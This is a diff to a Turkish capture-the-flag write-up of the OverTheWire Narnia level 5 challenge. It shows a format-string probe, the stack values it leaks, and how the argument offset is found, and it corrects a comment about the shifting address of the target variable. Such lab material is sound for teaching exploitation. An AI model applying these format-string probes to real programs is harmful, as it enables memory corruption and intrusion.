@@ -96,7 +96,7 @@ Başına `AAAA` koyup birkaç `%x` basarak, `41414141` ("AAAA") kaçıncı `%x`'
 narnia5@narnia:/narnia$ ./narnia5 'AAAA%x.%x.%x.%x.%x.'
 Change i's value from 1 -> 500. No way...let me give you a hint!
 buffer : [AAAAf7eb7746.ffffffff.ffffd6ae.f7e2fc34.41414141.] (49)
-i = 1 (0xffffd6cc)        # ← i'nin adresi de burada (ama bu UZUNLUK için)
+i = 1 (0xffffd6c0)        # ← bu UZUN payload için &i = 0xffffd6c0 (Adım 2'deki 14-byte payload'da FARKLI çıkacak!)
 ```
 
 `41414141` **5.** `%x`'te çıktı → **offset = 5**. Yani girdimizin başı 5. argüman pozisyonunda.
